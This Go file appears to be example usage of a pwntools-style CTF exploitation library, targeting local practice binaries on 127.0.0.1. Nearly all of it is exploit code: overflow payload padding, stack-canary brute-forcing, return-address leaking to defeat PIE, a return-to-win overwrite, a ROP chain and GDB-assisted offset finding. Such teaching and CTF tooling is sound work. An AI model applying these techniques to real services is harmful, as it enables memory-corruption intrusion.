package main

import (
	"fmt"
	"time"

	pwn "github.com/tonythetender/pwngears/process"
)

func main() {
	r, _ := pwn.RemoteSSL("127.0.0.1", 12069)
	defer r.Close()

	p, _ := pwn.Process("./command")
	defer p.Close()

	r.SendLine("shellcode")
	r.SendLine([]byte("shellcode"))

	r.SendLineAfter("Name: ", "test")
	response, _ := r.RecvLineString()
	fmt.Println(response)

	payload := pwn.Pay().
		PadTo(40).
		P64(0x401234).
		Add("shellcode").
		P32(0xdeadbeef)

	r.SendPayloadSize(payload)
	r.SendPayload(payload)

	exploit := pwn.NewExploit(r)
	exploit.SetConnectFunc(func() pwn.Tube {
		conn, _ := pwn.Connect("127.0.0.1", 12069)
		r.SendLine("Arthur")
		return conn
	})

	canary, _ := exploit.LeakCanary(40, func(tube pwn.Tube) bool {
		resp, _ := tube.RecvLine()
		return pwn.Contains(resp, "Saved")
	})

	retAddr, _ := exploit.LeakAddress(40, canary, 8, func(tube pwn.Tube) bool {
		resp, _ := tube.RecvLine()
		return pwn.Contains(resp, "Saved")
	})

	pieBase := retAddr - 0x1811
	winAddr := pieBase + 0x12e9

	pwn.Pay().
		PadTo(40).
		Canary(canary).
		Repeat("B", 8).
		P64(winAddr).
		SendWithSize(r)

	flag, _ := r.RecvAllString(3 * time.Second)
	pwn.Success(fmt.Sprintf("Flag: %s", flag))
}

func complexExploit() {
	r, _ := pwn.Connect("127.0.0.1", 1337)
	defer r.Close()

	exploit := pwn.NewExploit(r)
	offset := exploit.FindOffset("BBBB")

	rop := pwn.Pay().
		PadTo(offset).
		P64(0x401234).
		P64(0x601000).
		P64(0x401235).
		Bytes()

	r.Send(rop)
	r.Interactive()
}

func debugExploit() {
	p, _ := pwn.Proc("./vulnerable")
	defer p.Close()

	pwn.AttachGDB(p, `
        b *main+42
        commands
            x/10gx $rsp
            continue
        end
        continue
    `)

	p.Send(pwn.Cyclic(100))

	p.Wait()
}
